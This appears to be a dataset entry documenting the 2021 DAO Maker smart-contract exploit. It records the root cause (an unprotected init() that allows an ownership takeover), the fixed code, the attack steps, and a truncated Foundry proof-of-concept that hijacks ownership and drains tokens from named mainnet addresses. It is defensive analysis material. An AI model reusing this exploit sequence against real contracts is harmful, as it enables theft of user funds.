@@ -1,0 +1,35 @@
+{
+ "id": "2021__2021-09-04_DaoMaker_UnprotectedInit_EmergencyExit",
+ "source_file": "2021/2021-09-04_DaoMaker_UnprotectedInit_EmergencyExit.md",
+ "title": "DAO Maker — init() Re-initialization + emergencyExit() Fund Drain Analysis",
+ "date": "2021-09-04",
+ "protocol": "DAO Maker",
+ "chain": "Ethereum",
+ "loss_raw": "~$7,000,000 (CAPS, CPD, DERC, SHO, etc.)",
+ "loss_usd": 7000000.0,
+ "root_cause": "Unprotected `init()` function in SHO contracts allowed re-initialization to change ownership, followed by `emergencyExit()` to drain funds",
+ "attack_tx": "0x96bf6bd14a81",
+ "vulnerable_contract": "DAOMaker 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ DAOMaker SHO Contract\n// init() function has no initialization check\n// Target contracts:\n// 0x6e70c88be1d5c2a4c0c8205764d01abe6a3d2e22 (CAPS)\n// 0xd6c8dd834abeeefa7a663c1265ce840ca457b1ec (CPD)\n// 0xdd571023d95ff6ce5716bf112ccb752e86212167 (DERC)\n// 0xa43b89d5e7951d410585360f6808133e8b919289 (SHO)\n\ninterface DAOMaker {\n    // ❌ Unprotected init() — anyone can re-invoke\n    function init(\n        uint256 startTime,\n        uint256[] calldata releasePeriods,\n        uint256[] calldata releasePercents,\n        address token\n    ) external;\n\n    // Owner-only — once ownership is hijacked via init(), immediately exploitable\n    function emergencyExit(address to) external;\n}",
+  "// ❌ Root cause: Unprotected init() in SHO contracts allowed re-initialization to change ownership, followed by emergencyExit() to drain funds\n// ⚠️ Source for vulnerable function `init()` is not in this file\n// (Located in a Diamond pattern Facet or proxy implementation)\n// SPDX-License-Identifier: UNLICENSED\n// Source unverified — reverse-engineered from bytecode\n// Original: 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940 (Ethereum)\n// Reverse engineering method: function selector extraction + 4byte.directory decoding\n\npragma solidity ^0.8.0;\n\ncontract DaoMaker_Decompiled {\n}"
+ ],
+ "code_after": [
+  "// ✅ Using OpenZeppelin Initializable\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\ncontract DAOMakerSHO is Initializable, OwnableUpgradeable {\n    function initialize(\n        uint256 startTime,\n        uint256[] calldata releasePeriods,\n        uint256[] calldata releasePercents,\n        address token\n    ) external initializer {  // Executable only once\n        __Ownable_init();\n        _startTime = startTime;\n        _token = IERC20(token);\n        // ...\n    }\n\n    function emergencyExit(address to) external onlyOwner {\n        uint256 balance = _token.balanceOf(address(this));\n        _token.safeTransfer(to, balance);\n        emit EmergencyExit(to, balance);\n    }\n}",
+  "// ✅ OpenZeppelin Initializable + initialize immediately upon deployment\n// ✅ emergencyExit requires timelock + multisig\n\n// Deployment pattern: atomic deploy+initialize via factory contract\ncontract SHOFactory {\n    function createSHO(\n        uint256 startTime,\n        uint256[] calldata periods,\n        uint256[] calldata percents,\n        address token\n    ) external returns (address) {\n        SHOContract sho = new SHOContract();\n        sho.initialize(startTime, periods, percents, token); // initialize immediately\n        return address(sho);\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: Re-invoke init() on DAOMaker SHO contracts",
+  "→ msg.sender (attacker) registered as new owner",
+  "Step 2: Call daomaker.emergencyExit(address(this))",
+  "→ All DERC in contract transferred to attacker address",
+  "Step 3: 13.5M CAPS, 2.5M CPD×2, 1.44M DERC, 20.6M SHO drained"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────────┐\n│ Step 1: Re-invoke init() on DAOMaker SHO contracts           │\n│ daomaker.init(                                               │\n│   1640984401,                    // startTime               │\n│   [5702400],                     // releasePeriods          │\n│   [10000],                       // releasePercents (100%)  │\n│   0x9fa69536d1cda4A04cFB50688294de75B505a9aE  // DERC token │\n│ )                                                            │\n│ → msg.sender (attacker) registered as new owner             │\n└─────────────────────┬────────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────────┐\n│ Step 2: Call daomaker.emergencyExit(address(this))           │\n│",
+  "// testExploit() — mainnet fork block 13,155,320\nfunction testExploit() public {\n    uint256[] memory releasePeriods = new uint256[](1);\n    releasePeriods[0] = 5_702_400;\n    uint256[] memory releasePercents = new uint256[](1);\n    releasePercents[0] = 10_000; // 100%\n\n    emit log_named_decimal_uint(\n        \"Before exploiting, Attacker DERC balance\",\n        DERC.balanceOf(address(this)), 18\n    );\n\n    // 1. Hijack ownership via init()\n    // DAOMaker @ 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940\n    daomaker.init(\n        1_640_984_401,\n        releasePeriods,\n        releasePercents,\n        0x9fa69536d1cda4A04cFB50688294de75B505a9aE // DERC\n    );\n\n    // 2. Drain all tokens via emergencyExit()\n    daomaker.emergencyExit(address(this));\n\n    emit log_named_decimal_uint(\n        \"Afte"
+ ]
+}
